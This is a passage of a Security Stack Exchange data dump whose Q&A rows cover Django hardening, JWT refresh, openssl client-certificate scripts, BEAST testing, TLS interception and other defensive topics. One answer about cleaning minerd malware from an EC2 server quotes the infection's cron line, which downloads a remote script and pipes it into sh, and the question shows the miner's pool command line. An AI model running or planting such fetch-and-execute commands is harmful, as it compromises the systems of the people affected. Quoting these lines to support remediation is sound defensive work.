</ul>

<p>The reason why you have to do something extra for these cases is that Django's auto-escaping functionality uses an escaping function that is <em>supposed</em> to be one-size-fits-all, but in practice, one size doesn't always fit in every case; in some cases, you need to do something extra on your own.</p>

<p>For more information about what escaping rules to use in these special contexts, see the OWASP XSS cheatsheet.</p>

<p><strong>Other stuff.</strong> There are some other things you didn't mention:</p>

<ul>
<li><p>I recommend using SSL sitewide, if possible, and in that case enabling HSTS and marking all cookies with the 'secure' flag.  Search this site for details on the tradeoffs of doing so.  If you want to do so, Django <a href=""https://docs.djangoproject.com/en/dev/topics/security/#ssl-https"" rel=""nofollow noreferrer"">provides support for this</a>, and there are some resources on this site as well: <a href=""https://security.stackexchange.com/q/8964/971"">Trying to make a Django-based site use HTTPS-only, not sure if it&#39;s secure?</a></p></li>
<li><p>I recommend enabling <a href=""https://docs.djangoproject.com/en/dev/ref/clickjacking/#clickjacking-prevention"" rel=""nofollow noreferrer"">Django's clickjacking protection</a>.</p></li>
<li><p>Follow <a href=""https://docs.djangoproject.com/en/dev/topics/security/#host-headers-and-virtual-hosting"" rel=""nofollow noreferrer"">other advice in Django's documentation</a>.</p></li>
<li><p>You could check out <a href=""http://django-secure.readthedocs.org/en/latest/"" rel=""nofollow noreferrer"">django-secure</a> for some utilities to help you avoid forgetting some basic security steps, particularly if you are using SSL.</p></li>
<li><p>All of this good stuff is not a panacea.  It doesn't mean you can ignore security from here on.  It'll help you avoid some of the most common mistakes, but you still bear the ultimate responsibility for building a secure web application.</p></li>
</ul>

<p><strong>For more information.</strong> See <a href=""https://docs.djangoproject.com/en/dev/topics/security/"" rel=""nofollow noreferrer"">Django's documentation on security</a>, including <a href=""http://www.djangobook.com/en/2.0/chapter20.html"" rel=""nofollow noreferrer"">the chapter on security</a> in the Django book.</p>
","27807"
"How to install Cisco VPN Client on Windows 7 64bit","17547","","<p>I have Win7 64bit. Have Cisco VPN Client winx64-msi-5.0.07.0440-k9.<br>
Now i try to install it. But after i click first ""Next"" button in istaller i get error: </p>

<pre><code>""installation ended prematurely because of an error""
</code></pre>

<p>Google says that i shall uncheck all checkboxes into ICS (Internet Connection Sharing) in adapter setting but its not help.<br>
How to install it?</p>
","<p>Use the AnyConnect VPN Client, Cisco VPN client does not support x64</p>

<p>The Cisco VPN Client supports:</p>

<p>XP, Vista (x86/32-bit only), Windows 7 (x86/32-bit only), <strong>and Windows x64 (64-bit). Windows x64 support also provided by Cisco AnyConnect VPN Client</strong>
Linux (Intel)
Mac OS X 10.4 and 10.5
Solaris UltraSPARC (32- and 64-bit)</p>

<p>Source: <a href=""http://www.cisco.com/en/US/products/sw/secursw/ps2308/index.html"" rel=""nofollow"">http://www.cisco.com/en/US/products/sw/secursw/ps2308/index.html</a></p>

<p>If you can user other client you may like to test this one <a href=""http://www.shrew.net"" rel=""nofollow"">http://www.shrew.net</a></p>
","31904"
"Is my JWT refresh plan secure?","17528","","<p>I plan on using JWT for my login system for mobile devices. There is no real standard workflow for refreshing JWT tokens I could find so I created this one below. The reason I want to use JWT is for performance reasons. Instead of checking if a user is valid with a database call for every single request I trust the JWT.</p>

<p>I have the proposed workflow which I want to implement into my app. Is this acceptablly secure? Efficient? Are there any obvious problems I am overseeing? What reasonable improvments can be made?</p>

<h2>User logs in</h2>

<ol>
<li>If no HMAC signed token exists inside of localstorage, the user gives a name to the device.</li>
<li>DeviceName gets sent to the server where it is inserted into database.</li>
<li>JWT token + HMAC signed token of the DeviceName are sent back to user. The HMAC signed token is put in place to make sure the jwt token (containing DeviceName) is sent from the same device that called it originally.</li>
<li>JWT token is valid for X hours so a user can make any calls for X hours.</li>
<li>After X hours, the JWT is expired. When a request is made the server can see the JWT is expired. Server will now attempt to refresh the JWT token. Server checks the database to see if the DeviceName specified in the HMAC signed token is the same as a valid device name in the database for that user.</li>
<li>If so, create new JWT valid for another X hours, if no, send back message to require login.</li>
</ol>

<h2>If an account is compromised:</h2>

<p>User can log into my password service. Once logged in, I would retrieve all the devices for that user, the user can then revoke their compromised device. Once this is done, a request to refresh the JWT will not work with the stolen token.</p>

<p>All of this of course happens over SSL.</p>

<h2>My concerns which I have no solutions for:</h2>

<ul>
<li><p>If a JWT token is stolen the attacker has X hours to make calls based on the victim. I think this is the nature of tokens though and an accepted risk?</p></li>
<li><p>If the JWT is stolen, that means there is a good chance the HMAC token containing the device name is also hijacked so the user could refresh tokens until the victim realizes their account is compromised and revokes access. Is this accepted practice?</p></li>
</ul>
","<p>Acceptably secure within the realm of what?</p>

<p>You have described the basic flow for all bearer tokens. They who bear the token have the power. You do have a condition where you check if the token has been revoked, but that will mean the token is valid until they expire or are revoked. This is fundamentally the same as checking if the user is valid in the database, but you're replacing user with device + JWT. That's fine, but it's not much of a performance gain.</p>

<p>Other systems use two JWT's (or a JWT and an opaque token). The first JWT is your access token used mostly like you describe, but you don't check for revocation. This token is very short-lived -- maybe 20 min -> 1h, and then you have your refresh token which lives considerably longer. When your access token expires you send the refresh token and if the refresh token is still valid you issue a new access token. If the refresh token is expired you can force authentication again, or just issue a new access and refresh token.</p>

<p>The value here is that you only need to validate the refresh token against the database, and you only need to do that when the access token expires. When the user marks the refresh token as revoked then the refresh token doesn't get the attacker a new access token. </p>

<p>The trade off is that you don't query into the database as often, but the attacker can do whatever they want as long as the access token is valid. This is mitigated with using a very short lived token (its a game of odds). Whether this is an accepted risk is totally up to you. We don't dictate whether you should accept the risk. :)</p>
","91121"
"User can't navigate to webpage through the UI due to permissions, but are able to navigate to page by pasting the URL. How do I protect against this?","17503","","<p>In my application, users have certain roles which have permissions. These permissions dictate which UI elements are available to them at the home screen. Many of the elements link to other pages, which many users cannot see because their permissions do not allow them to go to that web page.</p>

<p>For example, a button called <code>button1</code> links to a random page in the application, let's say <code>http://www.example.com/example.jsp</code>. The user John however, has permissions set that don't allow him to see <code>button1</code>. Therefore John cannot go to <code>http://www.example.com/example.jsp</code>.</p>

<p>The issue I'm having is that if I am signed in as John, and I paste that URL, it will take me to the page.</p>

<p>Obviously this is a huge security risk if an attacker gets the URL to an administrator page for example. So, how can I protect against this? Do I need to verify the user for every single page, checking permissions and making sure that they are allowed to be there?</p>

<p>There are hundreds of pages in this application and that seems very redundant and not efficient to include code on every page to do so. Is there an easier way to do this than the method I just mentioned?</p>
","<blockquote>
  <p>Do I need to verify the user for every single page?</p>
</blockquote>

<p>Absolutely. Not only every page, but every request to a privileged resource, e.g POST request to update data, delete, view, etc, etc. It is not just about viewing the pages, it is about controlling who can do what on your system.</p>

<p>It sounds like your entire authentication and permissions system is broken in its current implementation. The steps to remedy this are too broad for this one answer. It would be worth a general search of this forum and the wider net to find solutions suitable for your framework (JSP, ASP.Net, PHP, etc.). Most frameworks have out-of-the-box functionality for solving this problem.   </p>

<p>A good start would be this high level guide from OWASP: <a href=""https://github.com/OWASP/DevGuide/blob/master/04-OperationalSecurity/Administrative-Interfaces.md"" rel=""noreferrer"">Operational Security: Administrative Interfaces</a>.</p>
","171024"
"Am I getting DDOS attacked?","17489","","<p>There has been some weird activity with my WiFi router after somebody threatened to DDoS me. I am looking at my WiFi router's activity logs and I don't know what I am looking for.<br>
What happens is my WiFi turns off, for all the devices in my house, then I can't connect to the internet for 1 minute or so.<br>
This has happened twice now after I got a call on my home phone from a Skype number that said ""this is LizardSquad"" and that they were going to hack me.<br>
Could somebody tell me what I should be looking for in the logs, and how I can better secure my WiFi so that it doesn't happen again?</p>
","<p>A DDoS attacks basically means the connection to your computer is saturated. There are several ways to do this but the result is the same: nobody can access your router and you may possibly not be able to go on Internet (roughly speaking).</p>

<p>No hacking is involved, once the DDoS stops you recover (you many need to reboot your router). So this is not ""hacking"" as per the movies, just a way of blocking access.</p>

<p>You may see some logs on your router (if you have any) but they may not be obvious. If you see a lot of traffic coming in it may be a DDoS. You may also not see much in the logs, it really depends on the attack.</p>

<p>If you are a home user you can file a complaint with your ISP but basically you need to wait until it is over. If this is repeated then you definitely should talk to your ISP (you cannot do anything yourself to protect against a DDoS).</p>

<p>Since you see that there are strange activity <strong>within</strong> your LAN (short of lack of Internet access) then it may be that this is not a DoS. Your WiFi may have been breached but this means that the attacker is nearby (as opposed to a DoS which can be done from the other side of the globe). Your first measure is to make sure you use WPA2 (see the  configuration of your router) and a looooong password.</p>

<p>If your internal network was compromised (ie. someone connected to your WiFi and possibly hacked other devices in your LAN) then the best thing to do is to reinstall the OS from scratch (particularly MS Windows and Linux).</p>
","84567"
"help understanding client certificate verification","17486","","<p>I am creating an API that only certain computers should have access to.  Communication will be via SSL between the server and the clients.  In order to verify that a client has access, I would like to create a certificate for each client, that is signed by the server.  Any clients that do not provide the certificate that is signed by the server, should be denied access.</p>

<p>I have an SSL certificate and key from GoDaddy.  I thought I should be able to create client certificates using this information, but everywhere I look, it seems like I need the CA certificate (from GoDaddy) to sign the client certificate and not my specific server's certificate/key.</p>

<p>This doesn't make sense to me, because it seems strange that I should have to go to GoDaddy and get a new certificate for every client.  I imagine that this isn't the case and that I am either doing something wrong, or don't understand completely.</p>

<p>So - How can I create a client certificate that is signed by my server certificate/password?</p>

<p>If your could provide commands (I am using openssl) to generate the client certificate from my server certificate, it would be greatly appreciated too.</p>

<p>Thanks!</p>
","<p>In order to sign client certificates, you will need a CA certificate you control. Paying for one is out of the question in most cases, as global-trusted CA certificates are a security hazard for the rest of the Internet. So in these cases you have to make your own CA and create your own server and client certificates.</p>

<p>So let's start with a basic <strong>openssl.conf</strong> file that we will use for generation of all these certificates:</p>

<pre><code>[ ca ]
default_ca  = CA_default                # The default ca section

[ CA_default ]
certs          = certs                  # Where the issued certs are kept
crl_dir        = crl                    # Where the issued crl are kept
database       = database.txt           # database index file.
new_certs_dir  = certs                  # default place for new certs.
certificate    = cacert.pem             # The CA certificate
serial         = serial.txt             # The current serial number
crl            = crl.pem                # The current CRL
private_key    = private\cakey.pem      # The private key
RANDFILE       = private\private.rnd    # private random number file

x509_extensions  = v3_usr               # The extentions to add to the cert
default_days     = 365
default_crl_days = 30                   # how long before next CRL
default_md       = sha256               # which md to use.
preserve         = no                   # keep passed DN ordering
policy           = policy_match
email_in_dn      = 

[ policy_match ]
commonName      = supplied

[ req ]
default_bits        = 2048
default_keyfile     = privkey.pem
distinguished_name  = req_distinguished_name
x509_extensions     = v3_ca

[ v3_ca ]
basicConstraints     = CA:TRUE
subjectKeyIdentifier = hash

[ v3_usr ]
basicConstraints     = CA:FALSE
subjectKeyIdentifier = hash

[ server ]
basicConstraints       = CA:FALSE
nsCertType             = server
nsComment              = ""Server Certificate""
subjectKeyIdentifier   = hash
authorityKeyIdentifier = keyid,issuer:always
extendedKeyUsage       = serverAuth
keyUsage               = digitalSignature, keyEncipherment

[ client ]
basicConstraints       = CA:FALSE
nsCertType             = client
nsComment              = ""Client Certificate""
subjectKeyIdentifier   = hash
authorityKeyIdentifier = keyid,issuer:always
extendedKeyUsage       = clientAuth
keyUsage               = digitalSignature

[ req_distinguished_name ]
</code></pre>

<p>This config file is made for automatic generation of certificates from a batch script. If you need more control or naming options, you need to adapt it to your situation.</p>

<p>So for generating a CA, go to the directory where you want to make your CA, put openssl.conf there and:</p>

<pre><code>PASSWORD=""PUT_YOUR_CA_PASSWORD_HERE""

# Make the config CA specific
cat openssl.conf &gt; use.conf
echo ""CN=PUT_CA_NAME_HERE"" &gt;&gt; use.conf

# Create the necessary files
mkdir keys requests certs 
touch database.txt
echo 01 &gt; serial.txt

# Generate your CA key (Use appropriate bit size here for your situation)
openssl genrsa -aes256 -out keys/ca.key -passout pass:$PASSWORD 2048

# Generate your CA req
openssl req -config use.conf -new -key keys/ca.key -out requests/ca.req -passin pass:$PASSWORD

# Make your self-signed CA certificate
openssl ca  -config use.conf -selfsign -keyfile keys/ca.key -out certs/ca.crt -in requests/ca.req -extensions v3_ca -passin pass:$PASSWORD -batch

# Cleanup
rm requests/ca.req use.conf
</code></pre>

<p>Now to generate a <strong>server</strong> certificate (e.g. for your web server):</p>

<pre><code>PASSWORD=""PUT_YOUR_CA_PASSWORD_HERE""
NAME=""PUT_THE_NAME_OF_SERVER_TO_GENERATE_HERE""

# Make the config Server specific
cat openssl.conf &gt; use.conf
echo ""CN=$NAME"" &gt;&gt; use.conf

openssl req -new -nodes -extensions server -out ""requests/$NAME.req"" -keyout ""$NAME.key"" -config use.conf -passin pass:$PASSWORD )
openssl ca -batch -extensions server -keyfile keys/ca.key -cert certs/ca.crt -config use.conf -out ""certs/$NAME.crt"" -passin pass:$PASSWORD -infiles ""requests/$NAME.req""

# Cleanup
rm ""requests/$NAME.req"" use.conf
</code></pre>

<p>Now to generate a <strong>client</strong> certificate:</p>

<pre><code>PASSWORD=""PUT_YOUR_CA_PASSWORD_HERE""
NAME=""PUT_THE_NAME_OF_CLIENT_TO_GENERATE_HERE""

# Make the config Client specific
cat openssl.conf &gt; use.conf
echo ""CN=$NAME"" &gt;&gt; use.conf

openssl req -new -nodes -extensions client -out ""requests/$NAME.req"" -keyout ""$NAME.key"" -config use.conf -passin pass:$PASSWORD )
openssl ca -batch -extensions client -keyfile keys/ca.key -cert certs/ca.crt -config use.conf -out ""certs/$NAME.crt"" -passin pass:$PASSWORD -infiles ""requests/$NAME.req""

# Cleanup
rm ""requests/$NAME.req"" use.conf
</code></pre>

<p>The only difference between generating keys and certificates for clients and servers it to prevent that a stolen client certificate can also be used to play a server and 'fool' other clients to connect to it (this only works as long as your applications support the client and server extension in certificates).</p>
","25569"
"What is the difference between a Hash Function and a Cryptographic Hash Function?","17428","","<p>I mean, is it just a matter of ""how difficult is it to reverse the function with the current technology""?</p>

<p>Or is there a mathematical concept or property that makes them different?</p>

<p>If it is a matter of ""how difficult is it to reverse the function"", then is it correct to say that with the progress of the technology, some Cryptographic Hash Functions stop being Cryptographic to be just Hash Functions? Is this what happened to MD5?</p>
","<p>Every cryptographic hash function is a hash function. But not every hash function is a cryptographic hash.</p>

<p>A cryptographic hash function aims to guarantee a number of security properties. Most importantly that it's hard to find collisions or pre-images and that the output appears random. (There are a few more properties, and ""hard"" has well defined bounds in this context, but that's not important here.)</p>

<p>Non cryptographic hash functions just try to avoid collisions for non malicious input. Some aim to detect accidental changes in data (CRCs), others try to put objects into different buckets in a hash table with as few collisions as possible.</p>

<p>In exchange for weaker guarantees they are typically (much) faster. </p>

<p>I'd still call MD5 a cryptographic hash function, since it aimed to provide security. But it's broken, and thus no longer usable as a cryptographic hash. On the other hand when you have a non cryptographic hash function, you can't really call it ""broken"", since it never tried to be secure in the first place.</p>
","11841"
"What to do about websites that store plain text passwords","17422","","<p>I recently received an email from a popular graduate job web site (prospects.ac.uk) that I haven't used in a while suggesting I use a new feature. It contained both my username and password in plain text. I presume this means that they have stored my password in plain text. </p>

<p>Is there anything that I can do to either improve their security or completely remove my details from there system?</p>

<p><strong>UPDATE:</strong> Thanks to everyone for their advise. I emailed them, spelling out what was wrong and why, saying that I will be writing to the DP commissioner and will be adding them to plaintextoffenders.com.</p>

<p>I got a response an hour later: an automated message containing a username and password for their support system. Oh dear...</p>
","<p>There isn't really much you can do, other than contact the website and try and explain them how bad of an idea and practice it is to store (and email) passwords in plain text.</p>

<p>One thing you can do is report any offending site to <a href=""http://plaintextoffenders.com"">plaintextoffenders.com</a> - a site (currently a tumblr blog, but we're working on a proper site soon) which lists different ""plain text offenders"" - sites that email you your own password, thus exposing the fact they either store it in plain text, or using a reversible encryption, which is just as bad.</p>

<p>With everything that's <a href=""http://arstechnica.com/tech-policy/news/2011/06/sony-hacked-yet-again-plaintext-passwords-posted.ars"">happened with Sony</a>, again and again, people become more aware to the dangers of sites storing sensitive details unencrypted, yet many still aren't. There are over 300 sites reported, with more reports coming every day!</p>

<p>Hopefully, plaintextoffenders.com helps by exposing more and more sites. Once this gets enough attention on twitter or other social media, sometimes sites change their way, and fix the problem! For example, <a href=""http://plaintextoffenders.com/post/6139194696/answering-the-call"">Smashing Magazine</a> and <a href=""http://seldo.tumblr.com/post/8698245004/dear-pingdom-you-should-not-be-storing-my"">Pingdom</a> have recently changed the way they deal with passwords, and no longer store nor email the passwords in plain text!</p>

<p>The problem is awareness, and I hope that we help the cause with plaintextoffenders.</p>
","7122"
"How to test for the BEAST attack if server isn't Internet-connected?","17393","","<p>I'd like to test a server specifically for vulnerabilities related to BEAST. What command line switches should I use?</p>

<p>What should I see (or not see) in the output?</p>

<p><em>Update</em></p>

<p>The intent is to scan a non-Internet connected web server, or to scan a server that is running on a non-default port.  In all other cases I could use <a href=""https://www.ssllabs.com/"">SSL Scan</a> for this task</p>
","<p>I have written a command-line tool called <a href=""http://www.bolet.org/TestSSLServer/"">TestSSLServer</a> which can be used for that job.</p>

<p>The tool makes a lot of aborted handshakes with the server (it sends the ClientHello and receives the ServerHello; then it closes the connection). First, it establishes the list of cipher suites supported by the server, by sending a full list of <em>many</em> suites, then removing one by one the suite that the server selects each time.</p>

<p>Then the tool sends another ClientHello, with maximum TLS version 1.0, and CBC-based cipher suites first, followed by non-CBC-based ones (suites taken among the ""strong"" suites that the server supports). If the server selects a non-CBC-based cipher suite, then it is deemed ""protected"" (the server enforces a choice which protects the client); if it selects a CBC cipher suite, then the tool reports ""vulnerable"" (there again, vulnerability is on the client side, but the server fails to enforce protection on the client).</p>
","21138"
"Are there technical differences which make Linux less vulnerable to virus than Windows?","17376","","<p>What makes Linux so different than Windows in terms of anti-virus needs?</p>

<p>My question is not <a href=""https://security.stackexchange.com/questions/63097/should-i-get-an-antivirus-for-ubuntu"">if I should get an anti-virus for my Linux</a>. I perfectly understand why an AV is important. </p>

<p>I would like to understand if there are conceptual (technical) differences which make Linux less vulnerable than Windows (comparing for example Ubuntu 14 and Windows 7).</p>
","<p>There are several reasons why Windows is so heavily inflated with anti-virus products. (I am pointing to out-of-the-box (OOTB) experiences).</p>

<p>Windows users are, by default, local administrators, so any social engineering done on Windows can usually lead to an execution of software. Modern Linux has users set-up as low-privilege local users. It requires your password to elevate privilege.</p>

<p>Windows tried to simplify as many things as possible including security and looking back at its history their butchering (<a href=""http://en.wikipedia.org/wiki/Windows_Vista"">Windows&nbsp;Vista</a> anyone?) of security controls left their user-base numb to constant false positives about software. The proverbial ""Do you want to install this software? Do you REALLY want to install this software?"" lead to just click-throughs or disabling <a href=""http://en.wikipedia.org/wiki/User_Account_Control"">UAC</a>.</p>

<p>Software repositories vs standalone installs:</p>

<p>Linux has had software repositories forever and they provide a good mechanism for installing software. These are usually signed, approved, software being protected by companies with budgets for security following standards for security. (I know about the breaches to repositories in the past, but this is generally good). Windows users are used to pulling sources from everywhere and installing on their system, unsigned or not.</p>

<p>Users generally have different mindsets:</p>

<p>Windows is an all-purpose, all-user platform. It generally tries to solve everyone's problems and in doing so, OOTB doesn't protect the user like it should. This why Microsoft pushes so hard to force every piece of software to be signed by a ""trusted signer"". There's plenty of debate on this, but generally from a security standpoint this is smart; Microsoft just happens to have a track record that leaves trust to be desired.</p>

<p>Linux users are generally technical and the systems are usually server systems. That's why software usually comes with <a href=""https://en.wikipedia.org/wiki/GNU_Privacy_Guard"">GPG</a> keys and/or SHA/<a href=""http://en.wikipedia.org/wiki/MD5"">MD5</a> hash for comparison, as these are from a Linux administrator perspective, de-facto processes for installing software. I know many Linux users who ignore this, but I have yet to see a Windows administrator even think about it.</p>

<p>So it does go beyond market share.</p>

<p><strong>Expansion:</strong></p>

<p>I will address a few things from the comments (which have valid points.)</p>

<p><em>Repositories:</em></p>

<p>From an OOTB experience modern Linux distributions have pre-signed packages which are more for identifying that a package works with the distribution, but also proves a secure method for verification.</p>

<p>Other package management system have been discussed such as <a href=""https://en.wikipedia.org/wiki/Pip_(package_manager)"">pip</a> and <a href=""https://en.wikipedia.org/wiki/Npm_(software)"">npm</a> which are independent of the distributions themselves and are servers to install specific packages for their particular programming language. It can be argued that there is no inherent way for verification on these systems. This is primary because Linux has a philosophy of programs doing one specific thing and doing it well. This is typically why multiple tools are used such as using GPG or <a href=""https://en.wikipedia.org/wiki/Pretty_Good_Privacy"">PGP</a> for integrity.</p>

<p><em>Script Downloads</em></p>

<p>cURL | sh has been mentioned and are truly no different than clicking on a .exe after you have downloaded the file. To point out, cURL is a <a href=""http://en.wikipedia.org/wiki/Command-line_interface"">CLI</a> tool for transferring data. It can do authentication, but it doesn't do verification specifically.</p>

<p><em>UAC vs sudo</em></p>

<p>Lastly, here are a few things about these two security features.</p>

<p>UAC is an approval process for untrusted software installation. A user which has local administrator rights simple gets a yes or no (the behavior can be changed, but it's not default). I am still looking to see if this behavior has changed on Windows&nbsp;8+, but I haven't seen anything on it.</p>

<p>Sudo is a fine-grained permission elevation system. By default it's essentially the same thing as UAC, but it has more ability to be configured to limit accessibility.</p>
","96010"
"What is the deal with Valicert SSL root certificates?","17363","","<p>Does anyone know what the status of the ""Valicert Class 2 Validation Authority"" root certificate is or what's going on with Valicert in general? I've heard that that cert has been deprecated, no longer honored, revoked, whatever. I got it from GoDaddy a while back and it cross-certifies to the Valicert root. It just seems to work sometimes and then sometimes I get folks tell me they have problems accessing my site. It is still on the GoDaddy root repository page but it's considered ""legacy"". I've been round and round with a GoDaddy rep on this and have now wasted 2 hours of my life. I really don't want to replace it if I don't have to. But I also noticed that its no longer being kept in the Windows trusted root cert store, which isn't a good sign. At least on my computer. </p>
","<p>The ""ValiCert Class 2 Policy Validation Authority"" root from 1999, along with about a dozen other roots from ValiCert and other CAs, are being phased out because they're only 1024 bits. 1024-bit RSA is <a href=""https://crypto.stackexchange.com/questions/1978/how-big-an-rsa-key-is-considered-secure-today"">increasingly close to being breakable</a><sup>1</sup>, so the community has decided to get rid of them in an orderly manner by 2011<sup>2</sup> to prevent a major security incident and panic in the coming years.</p>

<p>Mozilla's <a href=""https://wiki.mozilla.org/CA:MD5and1024"" rel=""nofollow noreferrer"">stated policy</a> was to disable them some time after December 31, 2013, and they have been <a href=""https://bugzilla.mozilla.org/show_bug.cgi?id=881553"" rel=""nofollow noreferrer"">actively working with the CAs to do so</a>.</p>

<p>In other words, yes, you have to replace it. What's the problem? I realize it's unpleasant<sup>3</sup>, but you have to renew it annually anyway, and this is less work. Maybe your CA will be willing to compensate you for the inconvenience you've suffered as a predictable consequence of their decision to use an obsolescent technology long after its sell by date.</p>

<p><sup>1</sup> I wouldn't be surprised if certain agencies could factor them -- slowly -- but I might be a little paranoid.<br>
<sup>2</sup> Wait, what's today's date again?<br>
<sup>3</sup> I remember Heartbleed.</p>
","65514"
"How can I kill minerd malware on an AWS EC2 instance?","17361","","<p>I have an AWS EC2 instance running RHEL 7.2 which seems to have been hacked by a BitCoin CPU Miner. When I run <code>ps -eo pcpu,args --sort=-%cpu | head</code>, it shows that there is a CPU miner that's taking up more than 90% of CPU utilization. </p>

<pre><code>%CPU COMMAND
99.8 /opt/minerd -B -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:8080 -u 47TS1NQvebb3Feq91MqKdSGCUq18dTEdmfTTrRSGFFC2fK85NRdABwUasUA8EUaiuLiGa6wYtv5aoR8BmjYsDmTx9DQbfRX -p x
</code></pre>

<p>It also shows up when I run <code>top -bn2 |sed -n '7,25'p</code> -</p>

<pre><code>  PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND
21863 root      20   0  237844   3300   1012 S 42.0  0.1   3:49.55 minerd
</code></pre>

<p>I keep trying to remove <code>minerd</code> from <code>/opt/</code> but it keeps spinning itself up again. Previously I had <code>KHK75NEOiq33</code> and a <code>yam</code> directory. I was able to delete them but not <code>minerd</code>.</p>

<p>How can I permanently remove this? I've also tried killing the <code>PID</code> individually with <code>sudo kill -9</code> and <code>sudo kill -2</code>. Is there any antivirus that I can use to get rid of it?</p>

<p><strong>EDIT</strong> - The question was marked as a possible duplicate to <a href=""https://security.stackexchange.com/questions/39231/how-do-i-deal-with-a-compromised-server"">another question</a>. However, the difference is that I'm inquiring about a specific malware. I have found the solution to the question, which I will be posting below.</p>
","<p>I found the solution to removing <code>minerd</code>. I was lucky enough to find the <a href=""http://pastie.org/10901367"" rel=""nofollow noreferrer"">actual script</a> that was used to infect my server. All I had to do was remove the elements placed by this script -</p>

<ol>
<li>On <a href=""https://security.stackexchange.com/users/26299/munkeyoto"">monkeyoto</a>'s <a href=""https://security.stackexchange.com/a/129457/116875"">suggestion</a>, I blocked all communication with the mining pool server - <code>iptables -A INPUT -s xmr.crypto-pool.fr -j DROP</code> and <code>iptables -A OUTPUT -d xmr.crypto-pool.fr -j DROP</code>.</li>
<li>Removed the cron <code>*/15 * * * * curl -fsSL https://r.chanstring.com/api/report?pm=0706 | sh</code> from <code>/var/spool/cron/root</code> and <code>/var/spool/cron/crontabs/root</code>. </li>
<li>Removed the directory <code>/opt/yam</code>. </li>
<li>Removed <code>/root/.ssh/KHK75NEOiq</code>.</li>
<li>Deleted the files <code>/opt/minerd</code> and <code>/opt/KHK75NEOiq33</code>.</li>
<li>Stopped the minerd process - <code>pkill minerd</code>.</li>
<li>Stopped <code>lady</code> - <code>service lady stop</code>.</li>
</ol>

<p>I ran <code>ps -eo pcpu,args --sort=-%cpu | head</code>, <code>top -bn2 |sed -n '7,25'p</code> and <code>ps aux | grep minerd</code> after that and the malware was nowhere to be seen.</p>

<p>I still need to figure out how it gained access into the system but I was able to disable it this way.</p>
","129487"
"What version of TLS does any web browser use when connecting to server where all SSL Protocols are enabled?","17360","","<p>All (almost all) web browsers have TLSv1.0 enabled by default, moreover TLSv1.1 and even TLSv1.2 can also be enabled by default.</p>

<p>What version of TLS will be used to connect to web server (e.g. Apache) with all <code>SSLProtocol</code> enabled?</p>

<p>What order of protocols will be used for browser with TLSv1.0-1.2 enabled by default?</p>

<p>For instance, we have a server with all protocols enabled (SSLv3, TLSv1, TLSv1.1 and TLSv1.2). Our browser has TLSv1.0, TLSv1.1 and TLSv1.2 enabled by default. What protocol will be used during first connection to server?</p>

<p>The same situation, but our web server has TLSv1.2 disabled. What will be browser behavior?</p>
","<p>The theory, as exposed in the <a href=""http://tools.ietf.org/html/rfc5246#section-7.4.1.3"">standard</a> is that:</p>

<blockquote>
<pre><code>server_version
   This field will contain the lower of that suggested by the client
   in the client hello and the highest supported by the server.
</code></pre>
</blockquote>

<p>In the <code>ClientHello</code> message, the client announces a single version, and this means ""I support all versions <em>up to</em> that version"". For instance, if the client says ""TLS 1.1"" then the client is somehow promising that it can handle SSL 3.0, TLS 1.0 and TLS 1.1. The server is then supposed to pick the most recent protocol version that both client and server support.</p>

<p>However, client implementations know that we do not live in a perfect world, and some servers get it wrong sometimes, so they do connections in a loop. For instance, the client first announces ""TLS 1.2"", but if the handshake fails for some reason which <em>might</em> be due to flaky support by the server, the client may try again, announcing only ""TLS 1.1"" or ""TLS 1.0"". Not all clients do that, but this is common for Web browsers. As @dave explains, a TLS 1.2 <code>ClientHello</code> may be larger than a previous version and make poorly written servers trip on it, so the ""try again with a lower version"" behaviour is, alas, necessary.</p>

<p>As explained above, the client only announces a range, so the client cannot express a support ""with holes"", e.g. supporting TLS 1.0 and 1.2 but not 1.1 (not that it makes a lot of sense). Similarly, the client sends both its ""maximum supported protocol version"" and its ordered list of supported cipher suites, so the client cannot express in a single <code>ClientHello</code> a preference such as: ""let's do TLS 1.2 and AES-CBC, but if we have to use TLS 1.0 then I would prefer RC4 because I am in mortal fear of the BEAST attack"". If a client wants to enforce such preferences, then it <em>must</em> do the ""multiple connections"" trick.</p>

<p><strong>To sum up</strong>, the normal paradigm of SSL is: <em>the client suggests, the server chooses</em>. But if the client wants to force the server into using some specific protocol version and/or cipher suite, then it can, through re-connections, and existing Web browsers do play such games occasionally.</p>
","55010"
"Which CA issued certificate for https://www.google.com","17353","","<p>I installed Kaspersky internet Security 2016 on my laptop;
in Firefox and Edge the root issuer is Kaspersky Anti-Virus Personal Root Certificate.
but in chrome the root issuer is GeoTrust. 
in my knowledge the Root CA certificate is self signed By Root. how Kaspersky changed the issuer name?
also it changes the Certificate Hierarchy
in Firefox the Hierarchy is :</p>

<pre><code>Kaspersky Anti-Virus Personal Root Certificate
    www.google.com
</code></pre>

<p>but in chrome the Hierarchy is :</p>

<pre><code>GeoTrust Global CA
    Google Internet Authority G2
        *.google.com
</code></pre>

<p>I check some another site but the all browser showed me an identical result? is this related to google chrome certificate pinning for some url?</p>
","<p>This ""Kaspersky Anti-Virus Personal Root Certificate"" is the sign that your anti-virus is actively intercepting the connection, in effect running a <a href=""https://en.wikipedia.org/wiki/Man-in-the-middle_attack"">Man-in-the-Middle attack</a>. This can work because your anti-virus runs locally (on your computer) its own certification authority, and inserted the corresponding CA key in the ""trusted store"" used by your browsers (well, not all of them, since it apparently did not do the job for Chrome -- as was remarked by @Neil, Chrome does not liked to be fooled about Google's certificate). Thus, the anti-virus generates on-the-fly a fake certificate for Google, which fools your browsers. The certificate you see in Edge or Firefox is not the one that Google's server sent, but the imitation produced locally on your computer by Kaspersky.</p>

<p>Anti-virus software does such things in order to be able to inspect data as it flows through SSL, without having to hook deep inside the code of the browsers. This is an ""honest MitM attack"".</p>
","104498"
"Does portforwarding present a risk to anonymity?","17347","","<p><a href=""https://airvpn.org/faq/"" rel=""nofollow"">AirVPN</a> by default has all ports closed but allows port-forwarding. I think this is required for P2P. Is this a threat to anonymity  (e.g. would the person at the other end of the P2P transmission know who you are) with port-forwarding set up?</p>

<p>I noticed other services such as BTGuard and PrivateInternetAccess don't mention port-forwarding yet are designed for P2P. Is this because all thier ports are opened by default?  </p>

<p><strong>Let me ask it this way</strong>. If you do the following does it allow people to see your real IP?</p>

<blockquote>
  <p>You provide Remote Port Forwarding, what is it? ""Remote port
  forwarding"" forwards traffic coming from the Internet to our VPN
  server ports to a specified local port of your client.</p>
  
  <p>By default, your account has no forwarded ports, and this is good as
  long as you don't wish to have a service reachable from the Internet.
